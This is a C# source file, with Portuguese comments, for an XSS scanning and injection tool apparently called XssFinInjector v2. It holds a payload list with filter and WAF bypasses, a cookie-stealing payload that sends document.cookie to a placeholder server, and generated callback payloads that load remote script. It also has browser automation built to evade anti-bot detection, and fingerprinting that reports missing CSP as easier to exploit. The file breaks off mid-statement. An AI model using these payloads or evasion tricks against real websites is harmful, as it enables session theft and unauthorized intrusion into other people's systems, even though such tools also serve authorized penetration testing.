using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using Microsoft.Playwright;

class Program
{
    // -------------------------------------------------------------------------
    // Biblioteca de payloads — básicos + bypasses de filtro
    // -------------------------------------------------------------------------
    static readonly List<string> Payloads = new()
    {
        // Básicos
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",

        // Injeção de atributo
        "\" onmouseover=\"alert('XSS')\"",
        "' onmouseover='alert(1)'",
        "\" autofocus onfocus=\"alert('XSS')\"",

        // Bypass de case
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script >alert('XSS')</script>",

        // Sem parênteses (bypass de WAF simples)
        "<script>alert`XSS`</script>",
        "<img src=x onerror=alert`XSS`>",

        // Event handlers alternativos
        "<details open ontoggle=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "<video src=x onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",

        // javascript: URI
        "javascript:alert('XSS')",

        // URL-encoded
        "%3Cscript%3Ealert('XSS')%3C/script%3E",

        // HTML entities
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",

        // Fragment (DOM)
        "#<img src=x onerror=alert('XSS')>",

        // Cookie stealer genérico
        "<script>fetch('http://SEU_SERVIDOR/?c='+document.cookie)</script>",
    };

    // URL do XSS Hunter (xss.report, xsshunter.com, ou servidor próprio)
    static string XssHunterUrl = "";

    // Template de rota SPA — ex: http://localhost:3000/#/search?q=PAYLOAD
    static string SpaRouteTemplate = "";

    // Gera payloads com callback externo dinamicamente
    static List<string> PayloadsHunter() => string.IsNullOrEmpty(XssHunterUrl) ? new() : new()
    {
        $"'\"><script src={XssHunterUrl}></script>",
        $"<script src={XssHunterUrl}></script>",
        $"<img src=x onerror=\"var s=document.createElement('script');s.src='{XssHunterUrl}';document.head.appendChild(s)\">",
        $"<svg onload=\"var s=document.createElement('script');s.src='{XssHunterUrl}';document.head.appendChild(s)\">",
        $"<img src=x onerror=\"fetch('{XssHunterUrl}?c='+document.cookie)\">",
        $"\" onmouseover=\"var s=document.createElement('script');s.src='{XssHunterUrl}';document.head.appendChild(s)\"",
        $"<script src=//{new Uri(XssHunterUrl).Host}{new Uri(XssHunterUrl).PathAndQuery}></script>",
    };

    static readonly List<ResultEntry> Results = new();
    // Burp Suite Proxy — sempre ativo (Community roda em 127.0.0.1:8080)
    const string BurpProxy = "http://127.0.0.1:8080";

    static readonly HttpClient Http = new(new HttpClientHandler
    {
        Proxy = new WebProxy(BurpProxy),
        UseProxy = true,
        // Aceita o certificado auto-assinado do Burp (senão HTTPS falha)
        ServerCertificateCustomValidationCallback = (_, _, _, _) => true
    })
    { Timeout = TimeSpan.FromSeconds(15) };

    // User-agent de Chrome real (evita userAgentCheck / appVersionCheck de anti-bots)
    const string RealUserAgent =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

    // Opções de launch do Playwright com proxy do Burp + args stealth
    static BrowserTypeLaunchOptions LaunchOpts() => new()
    {
        Headless = true,
        Proxy = new Proxy { Server = BurpProxy },
        // Remove a assinatura de automação que anti-bots detectam
        Args = new[]
        {
            "--disable-blink-features=AutomationControlled",
            "--disable-features=IsolateOrigins,site-per-process",
        }
    };

    // Cria uma página "stealth": user-agent real + apaga navigator.webdriver
    // e outras pistas de headless que sistemas anti-bot verificam.
    static async Task<IPage> NovaPaginaStealth(IBrowser browser)
    {
        var ctx = await browser.NewContextAsync(new BrowserNewContextOptions
        {
            UserAgent = RealUserAgent,
            IgnoreHTTPSErrors = true,       // aceita cert do Burp em HTTPS
            ViewportSize = new ViewportSize { Width = 1366, Height = 768 }
        });

        // Script rodado antes de qualquer JS da página.
        // NÃO falsificamos navigator.plugins de forma tosca — spoof inconsistente
        // é detectado (pluginArraySpoofing). Montamos um PluginArray realista.
        await ctx.AddInitScriptAsync(@"
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'languages', { get: () => ['pt-BR','pt','en-US','en'] });
            window.chrome = { runtime: {} };

            // PluginArray realista (mesmos plugins de um Chrome comum)
            const mk = (name, filename, desc) => {
                const p = Object.create(Plugin.prototype);
                Object.defineProperties(p, {
                    name:        { value: name },
                    filename:    { value: filename },
                    description: { value: desc },
                    length:      { value: 1 }
                });
                return p;
            };
            const plugins = [
                mk('PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
                mk('Chrome PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
                mk('Chromium PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
                mk('Microsoft Edge PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
                mk('WebKit built-in PDF', 'internal-pdf-viewer', 'Portable Document Format'),
            ];
            const arr = Object.create(PluginArray.prototype);
            plugins.forEach((p, i) => { arr[i] = p; });
            Object.defineProperty(arr, 'length', { value: plugins.length });
            Object.defineProperty(navigator, 'plugins', { get: () => arr });
        ");

        return await ctx.NewPageAsync();
    }

    // -------------------------------------------------------------------------
    static async Task Main(string[] args)
    {
        if (args.Length > 0 && args[0] == "install")
        {
            Info("Instalando browser do Playwright...");
            Microsoft.Playwright.Program.Main(new[] { "install", "chromium" });
            Info("Pronto! Rode 'dotnet run' para iniciar.");
            return;
        }

        string urlAlvo = "";
        bool sair = false;

        while (!sair)
        {
            PrintMenu(urlAlvo);
            string cmd = (Console.ReadLine() ?? "").Trim();
            Console.WriteLine();

            switch (cmd)
            {
                case "0":
                    if (!ValidarUrl(urlAlvo)) break;
                    await AutoRecon(urlAlvo);
                    break;

                case "1":
                    Console.Write("  URL alvo (ex: http://localhost:3000/rest/products/search?q=test): ");
                    urlAlvo = (Console.ReadLine() ?? "").Trim();
                    break;

                case "2":
                    ConfigurarHunter();
                    break;

                case "3":
                    if (!ValidarUrl(urlAlvo)) break;
                    await ScanGetParams(urlAlvo);
                    break;

                case "4":
                    if (!ValidarUrl(urlAlvo)) break;
                    await ScanForms(urlAlvo);
                    break;

                case "5":
                    if (!ValidarUrl(urlAlvo)) break;
                    await ScanGetParams(urlAlvo);
                    await ScanForms(urlAlvo);
                    break;

                case "6":
                    if (!ValidarUrl(urlAlvo)) break;
                    await ScanDomXss(urlAlvo);
                    break;

                case "7":
                    if (!ValidarUrl(urlAlvo)) break;
                    await ScanGetParams(urlAlvo);
                    await ScanForms(urlAlvo);
                    await ScanDomXss(urlAlvo);
                    break;

                case "8":
                    if (!ValidarUrl(urlAlvo)) break;
                    await ScanSpa(urlAlvo);
                    break;

                case "9":
                    await ScanSpaRoute();
                    break;

                case "10":
                    await PayloadManual(urlAlvo);
                    break;

                case "11":
                    MostrarResultados();
                    break;

                case "12":
                    ExportarRelatorio();
                    break;

                case "13":
                    sair = true;
                    break;

                default:
                    Warn("Opção inválida.");
                    break;
            }

            // Pausa antes de limpar a tela e voltar ao menu — para você
            // conseguir ler o resultado do scan (senão o Console.Clear() apaga).
            if (!sair && cmd != "1")
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("\n  [Enter] para voltar ao menu...");
                Console.ResetColor();
                Console.ReadLine();
            }
        }
    }

    // -------------------------------------------------------------------------
    // Configurar XSS Hunter
    // -------------------------------------------------------------------------
    static void ConfigurarHunter()
    {
        string atual = string.IsNullOrEmpty(XssHunterUrl) ? "(não configurado)" : XssHunterUrl;
        Info($"  XSS Hunter atual: {atual}");
        Console.Write("  Nova URL de callback (ex: https://xss.report/c/seuID): ");
        string nova = (Console.ReadLine() ?? "").Trim();

        if (string.IsNullOrEmpty(nova))
        {
            Warn("  Nenhuma URL inserida. Mantendo configuração atual.");
            return;
        }

        if (!Uri.TryCreate(nova, UriKind.Absolute, out _))
        {
            Warn("  URL inválida.");
            return;
        }

        XssHunterUrl = nova;
        Vuln($"  XSS Hunter configurado: {XssHunterUrl}");
        Info($"  {PayloadsHunter().Count} payloads de callback gerados e adicionados ao scan.");
    }

    // -------------------------------------------------------------------------
    // SCAN — Parâmetros GET (server-side)
    // -------------------------------------------------------------------------
    static async Task ScanGetParams(string urlBase)
    {
        Uri uri;
        try { uri = new Uri(urlBase); }
        catch { Warn("URL inválida."); return; }

        var queryParams = HttpUtility.ParseQueryString(uri.Query);

        if (queryParams.Count == 0)
        {
            Warn("Nenhum parâmetro GET na URL. Adicione algo como ?q=test&id=1");
            return;
        }

        Info($"[GET] Parâmetros encontrados: {string.Join(", ", queryParams.AllKeys!)}");

        foreach (string? param in queryParams.AllKeys)
        {
            if (param is null) continue;
            Info($"\n  Testando: ?{param}=...");
            int hits = 0;

            foreach (string payload in Payloads.Concat(PayloadsHunter()))
            {
                var q = HttpUtility.ParseQueryString(uri.Query);
                q[param] = payload;
                string testUrl = $"{uri.Scheme}://{uri.Authority}{uri.AbsolutePath}?{q}";

                (Reflexao tipo, int status) = await TestarPayloadHttp(testUrl, payload);

                if (tipo == Reflexao.Crua && status < 400)
                {
                    // Reflexão crua + status OK → provável XSS real
                    Vuln($"    [VULN] param={param} | status={status}");
                    Vuln($"           payload: {payload}");
                    Results.Add(new(testUrl, param, payload, status, "GET"));
                    hits++;
                }
                else if (tipo == Reflexao.Crua)
                {
                    // Crua mas em página de erro (4xx/5xx) → suspeito, não confirma
                    Warn($"    [reflect? {status}] payload cru em página de erro (provável falso-positivo): {TruncPayload(payload)}");
                }
                else if (tipo == Reflexao.Encodada)
                {
                    // Refletiu mas HTML-encoded → não executa
                    Dim($"    [encoded {status}] refletiu mas escapado (não executa): {TruncPayload(payload)}");
                }
                else
                {
                    Dim($"    [miss] {TruncPayload(payload)}");
                }

                await Task.Delay(100);
            }

            if (hits == 0) Info($"  Nenhum payload cru refletido em '{param}'.");
        }
    }

    // -------------------------------------------------------------------------
    // SCAN — Formulários (server-side)
    // -------------------------------------------------------------------------
    static async Task ScanForms(string urlBase)
    {
        Info("[FORM] Buscando formulários...");

        string html;
        try { html = await Http.GetStringAsync(urlBase); }
        catch (Exception ex) { Warn($"Erro ao buscar página: {ex.Message}"); return; }

        var forms = Regex.Matches(html, @"<form[^>]*>(.*?)</form>",
            RegexOptions.Singleline | RegexOptions.IgnoreCase);

        if (forms.Count == 0)
        {
            Warn("Nenhum formulário estático encontrado. (SPA? Use opção 8)");
            return;
        }

        Info($"[FORM] {forms.Count} formulário(s) encontrado(s).");

        foreach (Match form in forms)
        {
            string formHtml = form.Value;

            var actionM = Regex.Match(formHtml, @"action=[""']([^""']*)[""']", RegexOptions.IgnoreCase);
            string action = actionM.Success ? actionM.Groups[1].Value : urlBase;
            if (!action.StartsWith("http"))
                action = new Uri(new Uri(urlBase), action).ToString();

            var methodM = Regex.Match(formHtml, @"method=[""'](get|post)[""']", RegexOptions.IgnoreCase);
            string method = methodM.Success ? methodM.Groups[1].Value.ToUpper() : "GET";

            var inputNames = Regex.Matches(formHtml,
                @"<input[^>]*\bname=[""']([^""']+)[""'][^>]*>", RegexOptions.IgnoreCase)
                .Cast<Match>()
                .Select(m => m.Groups[1].Value)
                .Distinct()
                .ToList();

            if (inputNames.Count == 0) continue;

            Info($"\n  Form [{method}] {action}");
            Info($"  Campos: {string.Join(", ", inputNames)}");

            foreach (string field in inputNames)
            {
                Info($"\n    Testando campo: {field}");
                int hits = 0;

                foreach (string payload in Payloads.Concat(PayloadsHunter()))
                {
                    var formData = inputNames.ToDictionary(n => n, n => n == field ? payload : "test");

                    (Reflexao tipo, int status) = await TestarPayloadHttp(
                        action, payload, isPost: method == "POST", formData: formData);

                    if (tipo == Reflexao.Crua && status < 400)
                    {
                        Vuln($"      [VULN] field={field} | method={method} | status={status}");
                        Vuln($"             payload: {payload}");
                        Results.Add(new(action, field, payload, status, method));
                        hits++;
                    }
                    else if (tipo == Reflexao.Crua)
                    {
                        Warn($"      [reflect? {status}] payload cru em página de erro (provável falso-positivo): {TruncPayload(payload)}");
                    }
                    else if (tipo == Reflexao.Encodada)
                    {
                        Dim($"      [encoded {status}] refletiu mas escapado (não executa): {TruncPayload(payload)}");
                    }
                    else
                    {
                        Dim($"      [miss] {TruncPayload(payload)}");
                    }

                    await Task.Delay(100);
                }

                if (hits == 0) Info($"    Nenhum payload cru refletido em '{field}'.");
            }
        }
    }

    // -------------------------------------------------------------------------
    // SCAN — DOM XSS (browser headless via Playwright)
    // -------------------------------------------------------------------------
    static async Task ScanDomXss(string urlBase)
    {
        Info("[DOM] Iniciando scan com browser headless (Playwright)...");
        Info("[DOM] Isso pode demorar — o browser executa cada payload.\n");

        using var pw = await IniciarPlaywright();
        if (pw is null) return;

        await using var browser = await pw.Chromium.LaunchAsync(LaunchOpts());

        Uri uri = new(urlBase);
        var queryParams = HttpUtility.ParseQueryString(uri.Query);

        var alvos = queryParams.AllKeys?
            .Where(k => k != null)
            .Select(k => ($"param:{k}", k!))
            .ToList() ?? new();

        alvos.Add(("fragment:#", ""));

        foreach (var (label, paramName) in alvos)
        {
            Info($"  Testando: {label}");

            foreach (string payload in Payloads.Concat(PayloadsHunter()))
            {
                string testUrl = label.StartsWith("fragment")
                    ? $"{uri.Scheme}://{uri.Authority}{uri.AbsolutePath}#{payload}"
                    : BuildGetUrl(uri, paramName, payload);

                bool vuln = await TestarDom(browser, testUrl, payload, label);
                if (vuln) Results.Add(new(testUrl, label, payload, 200, "DOM"));

                await Task.Delay(200);
            }
        }

        Info("\n[DOM] Scan concluído.");
    }

    // -------------------------------------------------------------------------
    // SCAN — SPA inputs (Angular/React/Vue — formulários JS-renderizados)
    // -------------------------------------------------------------------------
    static async Task ScanSpa(string urlBase)
    {
        Info("[SPA] Navegando com browser e aguardando renderização JS...");
        Info("[SPA] Detecta inputs renderizados por Angular/React/Vue.\n");

        using var pw = await IniciarPlaywright();
        if (pw is null) return;

        await using var browser = await pw.Chromium.LaunchAsync(LaunchOpts());
        var page = await NovaPaginaStealth(browser);

        try
        {
            await page.GotoAsync(urlBase, new PageGotoOptions
            {
                Timeout = 15000,
                WaitUntil = WaitUntilState.NetworkIdle
            });
        }
        catch
        {
            // NetworkIdle pode dar timeout em SPAs com polling — tenta DOMContentLoaded
            try
            {
                await page.GotoAsync(urlBase, new PageGotoOptions
                {
                    Timeout = 10000,
                    WaitUntil = WaitUntilState.DOMContentLoaded
                });
            }
            catch (Exception ex)
            {
                Warn($"[SPA] Erro ao navegar: {ex.Message}");
                await page.CloseAsync();
                return;
            }
        }

        // Aguarda Angular/React terminar bootstrap
        await page.WaitForTimeoutAsync(2000);

        // Descobre inputs visíveis renderizados pelo JS
        var seletores = new[]
        {
            "input[type=text]:visible",
            "input[type=search]:visible",
            "input:not([type]):visible",
            "textarea:visible",
            "[contenteditable=true]:visible",
        };

        var inputs = new List<(string seletor, int indice)>();
        foreach (string sel in seletores)
        {
            int count = await page.Locator(sel).CountAsync();
            for (int i = 0; i < count; i++)
                inputs.Add((sel, i));
        }

        await page.CloseAsync();

        if (inputs.Count == 0)
        {
            Warn("[SPA] Nenhum input visível encontrado na página.");
            Warn("      Tente navegar para a rota correta ou use a opção 9 (route param).");
            return;
        }

        Info($"[SPA] {inputs.Count} input(s) encontrado(s). Iniciando injeção...\n");

        foreach (var (seletor, idx) in inputs)
        {
            Info($"  Input: {seletor}[{idx}]");

            foreach (string payload in Payloads.Concat(PayloadsHunter()))
            {
                var pg = await NovaPaginaStealth(browser);
                bool alertDisparado = false;
                string alertMsg = "";

                pg.Dialog += async (_, d) =>
                {
                    // Só conta se o alert for do NOSSO payload (evita validações do site)
                    if (EhNossoAlert(d.Message)) { alertDisparado = true; alertMsg = d.Message; }
                    await d.AcceptAsync();
                };

                try
                {
                    await pg.GotoAsync(urlBase, new PageGotoOptions { Timeout = 12000, WaitUntil = WaitUntilState.DOMContentLoaded });
                    await pg.WaitForTimeoutAsync(1500);

                    var loc = pg.Locator(seletor).Nth(idx);

                    // Limpa, digita payload e pressiona Enter
                    await loc.ClickAsync();
                    await loc.FillAsync("");
                    await loc.PressSequentiallyAsync(payload);
                    await loc.PressAsync("Enter");

                    // Tenta também clicar no botão de submit mais próximo
                    try
                    {
                        await pg.Locator("button[type=submit], input[type=submit], button:near(input)").First.ClickAsync(
                            new LocatorClickOptions { Timeout = 2000 });
                    }
                    catch { /* sem submit button visível */ }

                    await pg.WaitForTimeoutAsync(1500);

                    if (alertDisparado)
                    {
                        Vuln($"    [SPA VULN] {seletor}[{idx}] | alert='{alertMsg}'");
                        Vuln($"               payload: {payload}");
                        Results.Add(new(urlBase, $"{seletor}[{idx}]", payload, 200, "SPA"));
                    }
                    else
                    {
                        string dom = await pg.EvaluateAsync<string>("document.documentElement.innerHTML");
                        if (dom.Contains(payload, StringComparison.OrdinalIgnoreCase))
                            Warn($"    [SPA REFLECT] no DOM sem execução: {TruncPayload(payload)}");
                        else
                            Dim($"    [miss] {TruncPayload(payload)}");
                    }
                }
                catch (Exception ex)
                {
                    Dim($"    [err] {ex.Message[..Math.Min(60, ex.Message.Length)]}");
                }
                finally
                {
                    await pg.CloseAsync();
                }

                await Task.Delay(200);
            }
        }

        Info("\n[SPA] Scan concluído.");
    }

    // -------------------------------------------------------------------------
    // SCAN — SPA route param (Angular/React com PAYLOAD na URL)
    // -------------------------------------------------------------------------
    static async Task ScanSpaRoute()
    {
        string templateAtual = string.IsNullOrEmpty(SpaRouteTemplate)
            ? "(não configurado)"
            : SpaRouteTemplate;

        Info($"[ROUTE] Template atual: {templateAtual}");
        Info("  Use PAYLOAD como placeholder onde o payload será injetado.");
        Info("  Ex: http://localhost:3000/#/search?q=PAYLOAD");
        Console.Write("  Novo template (Enter = manter atual): ");
        string input = (Console.ReadLine() ?? "").Trim();

        if (!string.IsNullOrEmpty(input))
        {
            if (!input.Contains("PAYLOAD"))
            {
                Warn("  Template deve conter a palavra PAYLOAD.");
                return;
            }
            SpaRouteTemplate = input;
        }

        if (string.IsNullOrEmpty(SpaRouteTemplate))
        {
            Warn("  Configure o template primeiro.");
            return;
        }

        Info($"\n[ROUTE] Iniciando scan em: {SpaRouteTemplate}");
        Info("[ROUTE] Browser headless — aguarde.\n");

        using var pw = await IniciarPlaywright();
        if (pw is null) return;

        await using var browser = await pw.Chromium.LaunchAsync(LaunchOpts());

        foreach (string payload in Payloads.Concat(PayloadsHunter()))
        {
            // Injeta payload sem encoding (DOM XSS Angular lê do fragment antes do server)
            string testUrl = SpaRouteTemplate.Replace("PAYLOAD", payload);

            bool vuln = await TestarDom(browser, testUrl, payload, "route");
            if (vuln) Results.Add(new(testUrl, "route-param", payload, 200, "SPA-ROUTE"));

            await Task.Delay(200);
        }

        Info("\n[ROUTE] Scan concluído.");
    }

    // -------------------------------------------------------------------------
    // Payload manual
    // -------------------------------------------------------------------------
    static async Task PayloadManual(string urlAtual)
    {
        Console.Write("  URL (Enter = usar a atual): ");
        string url = (Console.ReadLine() ?? "").Trim();
        if (string.IsNullOrEmpty(url)) url = urlAtual;
        if (!ValidarUrl(url)) return;

        Console.Write("  Payload: ");
        string payload = Console.ReadLine() ?? "";

        Console.Write("  Parâmetro alvo (deixe vazio para 'xss'): ");
        string param = (Console.ReadLine() ?? "").Trim();
        if (string.IsNullOrEmpty(param)) param = "xss";

        string sep = url.Contains('?') ? "&" : "?";
        string testUrl = $"{url}{sep}{Uri.EscapeDataString(param)}={Uri.EscapeDataString(payload)}";

        (Reflexao tipo, int status) = await TestarPayloadHttp(testUrl, payload);

        if (tipo == Reflexao.Crua && status < 400)
            Vuln($"  [REFLETIDO CRU] Status: {status} — payload aparece SEM encoding (provável XSS)!");
        else if (tipo == Reflexao.Crua)
            Warn($"  [reflect? {status}] payload cru mas em página de erro — provável falso-positivo.");
        else if (tipo == Reflexao.Encodada)
            Info($"  [ENCODED] Status: {status} — refletiu mas HTML-escapado (não executa).");
        else
            Info($"  [miss] Status: {status} — payload não encontrado na resposta.");
    }

    // -------------------------------------------------------------------------
    // Helpers — Playwright
    // -------------------------------------------------------------------------
    static async Task<IPlaywright?> IniciarPlaywright()
    {
        try { return await Playwright.CreateAsync(); }
        catch
        {
            Warn("Playwright não encontrado. Execute primeiro:");
            Warn("  dotnet run -- install");
            return null;
        }
    }


    static async Task<bool> TestarDom(IBrowser browser, string testUrl, string payload, string label)
    {
        var page = await NovaPaginaStealth(browser);
        bool alertDisparado = false;
        string alertMsg = "";

        page.Dialog += async (_, dialog) =>
        {
            // Só conta se o alert for do NOSSO payload (evita validações do site)
            if (EhNossoAlert(dialog.Message)) { alertDisparado = true; alertMsg = dialog.Message; }
            await dialog.AcceptAsync();
        };

        try
        {
            await page.GotoAsync(testUrl, new PageGotoOptions
            {
                Timeout = 8000,
                WaitUntil = WaitUntilState.DOMContentLoaded
            });

            await page.WaitForTimeoutAsync(1500);

            if (alertDisparado)
            {
                Vuln($"    [DOM VULN] {label} | alert='{alertMsg}'");
                Vuln($"               payload: {payload}");
                return true;
            }

            // Auto-trigger: dispara eventos de interação (mouseover, focus, etc.)
            // pra acordar handlers como onmouseover / onfocus / ontoggle que
            // não executam sozinhos ao carregar a página.
            await DispararEventos(page);
            await page.WaitForTimeoutAsync(800);

            if (alertDisparado)
            {
                Vuln($"    [DOM VULN] {label} | alert='{alertMsg}' (via interação)");
                Vuln($"               payload: {payload}");
                return true;
            }

            string domHtml = await page.EvaluateAsync<string>("document.documentElement.innerHTML");
            if (domHtml.Contains(payload, StringComparison.OrdinalIgnoreCase))
                Warn($"    [DOM REFLECT] no DOM sem execução: {TruncPayload(payload)}");
            else
                Dim($"    [miss] {TruncPayload(payload)}");
        }
        catch (Exception ex)
        {
            Dim($"    [err] {ex.Message[..Math.Min(60, ex.Message.Length)]}");
        }
        finally
        {
            await page.CloseAsync();
        }

        return false;
    }

    // Confirma se o alert veio de um payload NOSSO (mensagem "XSS" ou "1"),
    // não de uma validação/alerta legítimo do próprio site.
    static bool EhNossoAlert(string msg)
    {
        string m = (msg ?? "").Trim();
        return m.Equals("XSS", StringComparison.OrdinalIgnoreCase) || m == "1";
    }

    // Dispara eventos de interação em todos os elementos para acordar
    // handlers que dependem de mouse/foco (onmouseover, onfocus, etc.).
    static async Task DispararEventos(IPage page)
    {
        try
        {
            await page.EvaluateAsync(@"
                () => {
                    const eventos = ['mouseover','mouseenter','mousemove','mousedown',
                                     'mouseup','click','focus','focusin','pointerover',
                                     'pointerenter','toggle'];
                    const els = document.querySelectorAll('*');
                    for (const el of els) {
                        for (const ev of eventos) {
                            try {
                                el.dispatchEvent(new Event(ev, { bubbles: true }));
                            } catch (e) {}
                        }
                        // Foco real em campos que suportam (dispara autofocus/onfocus)
                        if (typeof el.focus === 'function') {
                            try { el.focus(); } catch (e) {}
                        }
                        // <details> abre para disparar ontoggle
                        if (el.tagName === 'DETAILS') {
                            try { el.open = true; } catch (e) {}
                        }
                    }
                }
            ");
        }
        catch { /* página pode ter sido destruída pelo próprio alert — ok */ }
    }

    // -------------------------------------------------------------------------
    // Core HTTP
    // -------------------------------------------------------------------------
    // Resultado de um teste HTTP com qualidade da reflexão
    enum Reflexao { Nenhuma, Encodada, Crua }

    static async Task<(Reflexao tipo, int status)> TestarPayloadHttp(
        string url, string payload, bool isPost = false,
        Dictionary<string, string>? formData = null)
    {
        try
        {
            HttpResponseMessage response = isPost && formData != null
                ? await Http.PostAsync(url, new FormUrlEncodedContent(formData))
                : await Http.GetAsync(url);

            string body = await response.Content.ReadAsStringAsync();
            int status = (int)response.StatusCode;

            // 1) Payload apareceu CRU (sem encoding)? → potencial XSS real
            if (body.Contains(payload, StringComparison.OrdinalIgnoreCase))
                return (Reflexao.Crua, status);

            // 2) Só apareceu HTML-ENCODED? → refletiu mas não executa
            string encoded = HttpUtility.HtmlEncode(payload);
            if (!string.Equals(encoded, payload, StringComparison.Ordinal) &&
                body.Contains(encoded, StringComparison.OrdinalIgnoreCase))
                return (Reflexao.Encodada, status);

            return (Reflexao.Nenhuma, status);
        }
        catch { return (Reflexao.Nenhuma, 0); }
    }

    static string BuildGetUrl(Uri uri, string param, string payload)
    {
        var q = HttpUtility.ParseQueryString(uri.Query);
        q[param] = payload;
        return $"{uri.Scheme}://{uri.Authority}{uri.AbsolutePath}?{q}";
    }

    // -------------------------------------------------------------------------
    // Resultados
    // -------------------------------------------------------------------------
    static void MostrarResultados()
    {
        if (Results.Count == 0) { Info("Nenhuma vulnerabilidade encontrada ainda."); return; }

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine($"\n===== {Results.Count} VULNERABILIDADE(S) =====");
        foreach (var r in Results)
        {
            Console.WriteLine($"  Tipo:    {r.Method}");
            Console.WriteLine($"  URL:     {r.Url}");
            Console.WriteLine($"  Param:   {r.Param}");
            Console.WriteLine($"  Payload: {r.Payload}");
            Console.WriteLine($"  Status:  {r.StatusCode}");
            Console.WriteLine("  " + new string('-', 55));
        }
        Console.ResetColor();
    }

    static void ExportarRelatorio()
    {
        if (Results.Count == 0) { Warn("Nenhum resultado para exportar."); return; }

        string path = $"xss_report_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
        var sb = new StringBuilder();
        sb.AppendLine($"XssFinInjector v2 — Relatório gerado em {DateTime.Now}");
        sb.AppendLine(new string('=', 60));
        sb.AppendLine($"Total de vulnerabilidades: {Results.Count}");
        sb.AppendLine();
        foreach (var r in Results)
        {
            sb.AppendLine($"Tipo:    {r.Method}");
            sb.AppendLine($"URL:     {r.Url}");
            sb.AppendLine($"Param:   {r.Param}");
            sb.AppendLine($"Payload: {r.Payload}");
            sb.AppendLine($"Status:  {r.StatusCode}");
            sb.AppendLine(new string('-', 60));
        }

        File.WriteAllText(path, sb.ToString(), Encoding.UTF8);
        Info($"Relatório salvo em: {Path.GetFullPath(path)}");
    }

    // -------------------------------------------------------------------------
    // FINGERPRINT — detecta stack (tipo Wappalyzer) e recomenda estratégia
    // -------------------------------------------------------------------------
    static async Task Fingerprint(string urlBase)
    {
        Info("[FINGERPRINT] Analisando stack do alvo...\n");

        string html = "";
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        try
        {
            var resp = await Http.GetAsync(urlBase);
            html = await resp.Content.ReadAsStringAsync();

            foreach (var h in resp.Headers)
                headers[h.Key] = string.Join(", ", h.Value);
            foreach (var h in resp.Content.Headers)
                headers[h.Key] = string.Join(", ", h.Value);
        }
        catch (Exception ex)
        {
            Warn($"[FINGERPRINT] Falha ao buscar alvo: {ex.Message}");
            return;
        }

        var detectado = new List<string>();
        var flags     = new HashSet<string>(); // spa, waf, jquery-old

        // --- Headers reveladores ---
        void H(string key, string label)
        {
            if (headers.TryGetValue(key, out var v) && !string.IsNullOrWhiteSpace(v))
                detectado.Add($"{label}: {v}");
        }
        H("Server", "Server");
        H("X-Powered-By", "X-Powered-By");
        H("X-AspNet-Version", "ASP.NET");
        H("X-Generator", "Generator");

        // --- WAF / CDN ---
        var wafSigs = new (string header, string val, string nome)[]
        {
            ("Server", "cloudflare", "Cloudflare"),
            ("CF-RAY", "", "Cloudflare"),
            ("X-Sucuri-ID", "", "Sucuri WAF"),
            ("Server", "awselb", "AWS ELB"),
            ("X-Akamai-Transformed", "", "Akamai"),
            ("Server", "imperva", "Imperva/Incapsula"),
            ("X-CDN", "", "CDN genérico"),
        };
        foreach (var (hk, val, nome) in wafSigs)
        {
            if (headers.TryGetValue(hk, out var hv) &&
                (val == "" || hv.Contains(val, StringComparison.OrdinalIgnoreCase)))
            {
                detectado.Add($"WAF/CDN: {nome}");
                flags.Add("waf");
            }
        }

        // --- Frameworks front (assinaturas no HTML) ---
        var frontSigs = new (string regex, string nome, bool spa)[]
        {
            (@"ng-version|ng-app|_nghost|_ngcontent", "Angular", true),
            (@"data-reactroot|react(-dom)?[\.-]|__NEXT_DATA__", "React", true),
            (@"data-v-[0-9a-f]{8}|__vue__|v-cloak", "Vue.js", true),
            (@"svelte-", "Svelte", true),
            (@"wp-content|wp-includes", "WordPress", false),
            (@"Drupal\.settings|/sites/default/", "Drupal", false),
            (@"/media/jui/|Joomla", "Joomla", false),
        };
        foreach (var (rx, nome, spa) in frontSigs)
        {
            if (Regex.IsMatch(html, rx, RegexOptions.IgnoreCase))
            {
                detectado.Add($"Framework/CMS: {nome}");
                if (spa) flags.Add("spa");
            }
        }

        // --- jQuery e versão ---
        var jq = Regex.Match(html, @"jquery[.\-/]?(\d+\.\d+\.\d+)", RegexOptions.IgnoreCase);
        if (jq.Success)
        {
            string ver = jq.Groups[1].Value;
            detectado.Add($"Lib JS: jQuery {ver}");
            // jQuery < 3.5.0 tem sinks de DOM XSS conhecidos
            var parts = ver.Split('.').Select(p => int.TryParse(p, out var n) ? n : 0).ToArray();
            if (parts.Length >= 2 && (parts[0] < 3 || (parts[0] == 3 && parts[1] < 5)))
                flags.Add("jquery-old");
        }

        // --- Content-Type / CSP ---
        if (headers.TryGetValue("Content-Security-Policy", out var csp))
            detectado.Add($"CSP presente (dificulta XSS): {TruncPayload(csp)}");
        else
            detectado.Add("CSP: ausente (XSS mais fácil de explorar)");

        // --- Exibe resultado ---
        if (detectado.Count == 0)
            Warn("  Nenhuma tecnologia identificada.");
        else
            foreach (var d in detectado) Vuln($"  • {d}");

        // --- Recomendação de estratégia ---
        Console.WriteLine();
        Info("[FINGERPRINT] Estratégia recomendada:");
        if (flags.Contains("spa"))
            Info("  → SPA detectada: use opção 8 (SPA inputs) e 9 (SPA route). Mire sinks como innerHTML/bypassSecurityTrust.");
        else
            Info("  → App tradicional: opções 3/4 (GET/forms) tendem a funcionar bem.");

        if (flags.Contains("waf"))
